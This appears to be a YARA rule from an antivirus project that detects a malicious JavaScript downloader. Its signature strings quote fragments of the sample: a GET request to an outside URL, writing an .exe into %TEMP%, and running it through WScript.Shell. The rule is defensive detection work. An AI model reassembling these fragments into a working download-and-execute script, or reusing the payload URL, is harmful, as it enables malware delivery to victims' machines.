rule sig_20160329_2e566ba01195a73e07ed759bb779aa5c {
  meta:
    description = "datamaliciousorder - file 20160329_2e566ba01195a73e07ed759bb779aa5c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ae827b74bde1fb45b74f038f22ede8fe24f189f89b56c691ff8498bec3fc9f96"

  strings:
    $s1  = "A0[jB](\"GET\", \"http://blog.insite.pt/m8djs\", false);" fullword ascii
    $s2  = "function px() {return FX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hiDtaR3ha4L.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[uP](t() * 11); if (A0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var FX = function jQ() {return WScript[L](\"WScript.Shell\");}(), h = 11;" fullword ascii
    $s5  = "function pS(L0, Du){Vy = Vy * 1; return L0 - Du;};" fullword ascii
    $s6  = "function wy(){return \"\" + Z;};" fullword ascii
    $s7  = "function GG(N){FX[\"Run\"](N, Vy, Vy);};" fullword ascii
    $s8  = "function T() {return ((sw == true) && (sw == R)) ? 1 : Vy;};" fullword ascii
    $s9  = " while (Y){" fullword ascii
    $s10 = "return pS(Ad, gH);" fullword ascii
    $s11 = "function W(pa) {var MR = (1, 2, 3, 4, 5, pa); return MR;};" fullword ascii
    $s12 = "function e()" fullword ascii
    $s13 = "function t(){return 22;};" fullword ascii
    $s14 = "var w = new this[\"Date\"]();" fullword ascii
    $s15 = "function m(){return L;};" fullword ascii
    $s16 = "var N0 = false;" fullword ascii
    $s17 = "sw = true; " fullword ascii
    $s18 = "var sw = false;" fullword ascii
    $s19 = "} catch(u){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}